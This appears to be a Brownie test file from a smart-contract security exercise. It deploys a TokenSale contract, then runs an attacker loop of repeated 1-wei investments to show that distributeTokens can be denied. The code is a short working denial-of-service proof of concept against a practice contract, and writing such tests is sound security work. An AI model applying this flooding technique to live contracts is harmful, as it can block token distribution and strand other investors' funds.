from scripts.DOS_helper import *
from brownie import TokenSale
import brownie
import timeout_decorator


def test_dos_1():

    token_sale = TokenSale.deploy({'from': deployer})

    @timeout_decorator.timeout(10)
    def attack():
        i =0
        while True:
            i = i+1
            token_sale.invest({'from': attacker, 'value': 1}).wait(1)
        return print(i)


    token_sale.invest({'from': user1,'value': USER1_INVESTMENT})
    token_sale.invest({'from': user2,'value': USER2_INVESTMENT})
    token_sale.invest({'from': user3,'value': USER3_INVESTMENT})
    assert(token_sale.claimable(user1.address, 0,{'from': attacker}) == USER1_INVESTMENT*5)
    assert(token_sale.claimable(user2.address, 0,{'from': attacker}) == USER2_INVESTMENT*5)
    assert(token_sale.claimable(user3.address, 0,{'from': attacker}) == USER3_INVESTMENT*5)

    try:
        attack()
    except:
        pass

    print("Incomming DOS")

    try:
        token_sale.distributeTokens({'from': deployer}).wait(3)
    except brownie.exceptions.RPCRequestError:
        pass
    